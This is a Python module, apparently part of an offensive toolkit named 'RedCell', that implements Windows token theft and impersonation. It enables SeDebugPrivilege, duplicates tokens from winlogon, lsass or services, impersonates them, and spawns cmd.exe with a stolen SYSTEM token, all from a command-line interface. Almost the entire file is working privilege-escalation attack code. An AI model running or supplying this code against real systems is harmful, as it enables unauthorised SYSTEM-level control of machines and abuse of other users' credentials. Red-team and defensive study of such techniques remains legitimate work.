"""
Token Manipulation Module (Windows)

Windows token manipulation and impersonation techniques.
"""

import ctypes
from ctypes import wintypes
import platform
import subprocess
from typing import Optional, List


# Windows API constants
TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_IMPERSONATE = 0x0004
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ALL_ACCESS = 0xF01FF

PROCESS_QUERY_INFORMATION = 0x0400

SE_PRIVILEGE_ENABLED = 0x00000002

SecurityImpersonation = 2
TokenPrimary = 1


class TokenManipulation:
    """
    Windows token manipulation and impersonation.

    Techniques:
    - Token stealing from processes
    - Token impersonation
    - Privilege enabling
    - Creating processes with stolen tokens
    - Token duplication
    """

    def __init__(self):
        """Initialize token manipulation."""
        if 'windows' not in platform.system().lower():
            raise OSError("Token manipulation is Windows-only")

        # Load Windows APIs
        self.kernel32 = ctypes.windll.kernel32
        self.advapi32 = ctypes.windll.advapi32

        self.current_token = None

    def open_process_token(self, pid: int) -> Optional[int]:
        """
        Open process token.

        Args:
            pid: Process ID

        Returns:
            Token handle or None
        """
        try:
            # Open process
            h_process = self.kernel32.OpenProcess(
                PROCESS_QUERY_INFORMATION,
                False,
                pid
            )

            if not h_process:
                print(f"[-] Failed to open process {pid}")
                return None

            # Open process token
            h_token = wintypes.HANDLE()
            result = self.advapi32.OpenProcessToken(
                h_process,
                TOKEN_QUERY | TOKEN_DUPLICATE,
                ctypes.byref(h_token)
            )

            self.kernel32.CloseHandle(h_process)

            if result:
                print(f"[+] Opened token for PID {pid}")
                return h_token.value
            else:
                print(f"[-] Failed to open token for PID {pid}")
                return None

        except Exception as e:
            print(f"[-] Error opening process token: {e}")
            return None

    def duplicate_token(
        self,
        h_token: int,
        impersonation_level: int = SecurityImpersonation
    ) -> Optional[int]:
        """
        Duplicate a token.

        Args:
            h_token: Source token handle
            impersonation_level: Impersonation level

        Returns:
            Duplicated token handle or None
        """
        try:
            h_new_token = wintypes.HANDLE()

            result = self.advapi32.DuplicateTokenEx(
                h_token,
                TOKEN_ALL_ACCESS,
                None,
                impersonation_level,
                TokenPrimary,
                ctypes.byref(h_new_token)
            )

            if result:
                print("[+] Token duplicated successfully")
                return h_new_token.value
            else:
                print("[-] Failed to duplicate token")
                return None

        except Exception as e:
            print(f"[-] Error duplicating token: {e}")
            return None

    def impersonate_token(self, h_token: int) -> bool:
        """
        Impersonate a token.

        Args:
            h_token: Token handle to impersonate

        Returns:
            True if successful
        """
        try:
            result = self.advapi32.ImpersonateLoggedOnUser(h_token)

            if result:
                print("[+] Successfully impersonating token")
                self.current_token = h_token
                return True
            else:
                print("[-] Failed to impersonate token")
                return False

        except Exception as e:
            print(f"[-] Error impersonating token: {e}")
            return False

    def revert_to_self(self) -> bool:
        """
        Revert from impersonation.

        Returns:
            True if successful
        """
        try:
            result = self.advapi32.RevertToSelf()

            if result:
                print("[+] Reverted to self")
                self.current_token = None
                return True
            else:
                print("[-] Failed to revert to self")
                return False

        except Exception as e:
            print(f"[-] Error reverting to self: {e}")
            return False

    def enable_privilege(self, privilege_name: str) -> bool:
        """
        Enable a privilege in current process token.

        Args:
            privilege_name: Privilege name (e.g., 'SeDebugPrivilege')

        Returns:
            True if successful
        """
        try:
            # Get current process token
            h_token = wintypes.HANDLE()
            h_process = self.kernel32.GetCurrentProcess()

            result = self.advapi32.OpenProcessToken(
                h_process,
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                ctypes.byref(h_token)
            )

            if not result:
                print("[-] Failed to open current process token")
                return False

            # Lookup privilege value
            luid = wintypes.LUID()
            result = self.advapi32.LookupPrivilegeValueW(
                None,
                privilege_name,
                ctypes.byref(luid)
            )

            if not result:
                print(f"[-] Failed to lookup privilege: {privilege_name}")
                self.kernel32.CloseHandle(h_token)
                return False

            # Define TOKEN_PRIVILEGES structure
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [
                    ('PrivilegeCount', wintypes.DWORD),
                    ('Luid', wintypes.LUID),
                    ('Attributes', wintypes.DWORD),
                ]

            tp = TOKEN_PRIVILEGES()
            tp.PrivilegeCount = 1
            tp.Luid = luid
            tp.Attributes = SE_PRIVILEGE_ENABLED

            # Adjust token privileges
            result = self.advapi32.AdjustTokenPrivileges(
                h_token,
                False,
                ctypes.byref(tp),
                0,
                None,
                None
            )

            self.kernel32.CloseHandle(h_token)

            if result:
                print(f"[+] Enabled privilege: {privilege_name}")
                return True
            else:
                print(f"[-] Failed to enable privilege: {privilege_name}")
                return False

        except Exception as e:
            print(f"[-] Error enabling privilege: {e}")
            return False

    def steal_system_token(self) -> Optional[int]:
        """
        Attempt to steal SYSTEM token from a system process.

        Returns:
            SYSTEM token handle or None
        """
        print("[*] Attempting to steal SYSTEM token...")

        # Enable SeDebugPrivilege
        self.enable_privilege('SeDebugPrivilege')

        # Target system processes
        system_processes = ['winlogon.exe', 'lsass.exe', 'services.exe']

        for proc_name in system_processes:
            try:
                # Find process ID
                result = subprocess.run(
                    ['tasklist', '/FI', f'IMAGENAME eq {proc_name}', '/FO', 'CSV', '/NH'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if result.returncode == 0:
                    import re
                    match = re.search(rf'"{proc_name}","(\d+)"', result.stdout)

                    if match:
                        pid = int(match.group(1))
                        print(f"[*] Found {proc_name} with PID {pid}")

                        # Open and duplicate token
                        h_token = self.open_process_token(pid)

                        if h_token:
                            h_dup_token = self.duplicate_token(h_token)
                            self.kernel32.CloseHandle(h_token)

                            if h_dup_token:
                                print(f"[+] Successfully stole SYSTEM token from {proc_name}")
                                return h_dup_token

            except Exception as e:
                print(f"[-] Error with {proc_name}: {e}")
                continue

        print("[-] Failed to steal SYSTEM token")
        return None

    def create_process_with_token(
        self,
        h_token: int,
        command: str = "cmd.exe"
    ) -> bool:
        """
        Create a process using a stolen token.

        Args:
            h_token: Token handle
            command: Command to execute

        Returns:
            True if successful
        """
        try:
            # Define STARTUPINFO structure
            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ('cb', wintypes.DWORD),
                    ('lpReserved', wintypes.LPWSTR),
                    ('lpDesktop', wintypes.LPWSTR),
                    ('lpTitle', wintypes.LPWSTR),
                    ('dwX', wintypes.DWORD),
                    ('dwY', wintypes.DWORD),
                    ('dwXSize', wintypes.DWORD),
                    ('dwYSize', wintypes.DWORD),
                    ('dwXCountChars', wintypes.DWORD),
                    ('dwYCountChars', wintypes.DWORD),
                    ('dwFillAttribute', wintypes.DWORD),
                    ('dwFlags', wintypes.DWORD),
                    ('wShowWindow', wintypes.WORD),
                    ('cbReserved2', wintypes.WORD),
                    ('lpReserved2', ctypes.POINTER(wintypes.BYTE)),
                    ('hStdInput', wintypes.HANDLE),
                    ('hStdOutput', wintypes.HANDLE),
                    ('hStdError', wintypes.HANDLE),
                ]

            # Define PROCESS_INFORMATION structure
            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ('hProcess', wintypes.HANDLE),
                    ('hThread', wintypes.HANDLE),
                    ('dwProcessId', wintypes.DWORD),
                    ('dwThreadId', wintypes.DWORD),
                ]

            si = STARTUPINFO()
            si.cb = ctypes.sizeof(STARTUPINFO)

            pi = PROCESS_INFORMATION()

            # Create process with token
            result = self.advapi32.CreateProcessAsUserW(
                h_token,
                None,
                command,
                None,
                None,
                False,
                0,
                None,
                None,
                ctypes.byref(si),
                ctypes.byref(pi)
            )

            if result:
                print(f"[+] Created process with stolen token: PID {pi.dwProcessId}")
                self.kernel32.CloseHandle(pi.hProcess)
                self.kernel32.CloseHandle(pi.hThread)
                return True
            else:
                error = self.kernel32.GetLastError()
                print(f"[-] Failed to create process: Error {error}")
                return False

        except Exception as e:
            print(f"[-] Error creating process with token: {e}")
            return False

    def get_token_user(self, h_token: int) -> Optional[str]:
        """
        Get username from token.

        Args:
            h_token: Token handle

        Returns:
            Username or None
        """
        try:
            # This is a simplified version
            # Full implementation would use GetTokenInformation
            print("[*] Token user information retrieval not fully implemented")
            return None

        except Exception as e:
            print(f"[-] Error getting token user: {e}")
            return None

    def list_privileges(self) -> List[str]:
        """
        List current process privileges.

        Returns:
            List of privilege names
        """
        try:
            result = subprocess.run(
                ['whoami', '/priv'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                # Parse privileges
                privileges = []
                for line in result.stdout.split('\n'):
                    if 'Privilege Name' in line or '----' in line:
                        continue

                    parts = line.split()
                    if len(parts) >= 2:
                        privileges.append(parts[0])

                return privileges

        except Exception as e:
            print(f"[-] Error listing privileges: {e}")

        return []

    def cleanup(self):
        """Clean up token handles."""
        if self.current_token:
            try:
                self.revert_to_self()
                self.kernel32.CloseHandle(self.current_token)
                self.current_token = None
            except:
                pass


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Token Manipulation')
    parser.add_argument('--steal-system', action='store_true',
                       help='Steal SYSTEM token')
    parser.add_argument('--impersonate-pid', type=int,
                       help='Impersonate token from process ID')
    parser.add_argument('--enable-privilege', help='Enable privilege')
    parser.add_argument('--list-privileges', action='store_true',
                       help='List current privileges')
    parser.add_argument('--spawn-cmd', action='store_true',
                       help='Spawn cmd.exe with stolen token')

    args = parser.parse_args()

    try:
        token_manip = TokenManipulation()

        if args.list_privileges:
            print("[*] Current privileges:")
            for priv in token_manip.list_privileges():
                print(f"  {priv}")

        if args.enable_privilege:
            token_manip.enable_privilege(args.enable_privilege)

        if args.impersonate_pid:
            h_token = token_manip.open_process_token(args.impersonate_pid)
            if h_token:
                h_dup = token_manip.duplicate_token(h_token)
                if h_dup:
                    if args.spawn_cmd:
                        token_manip.create_process_with_token(h_dup, "cmd.exe")
                    else:
                        token_manip.impersonate_token(h_dup)

        if args.steal_system:
            h_system_token = token_manip.steal_system_token()
            if h_system_token:
                if args.spawn_cmd:
                    token_manip.create_process_with_token(h_system_token, "cmd.exe")
                else:
                    print("[+] SYSTEM token obtained")

    except Exception as e:
        print(f"[-] Error: {e}")

    finally:
        if 'token_manip' in locals():
            token_manip.cleanup()


if __name__ == '__main__':
    main()
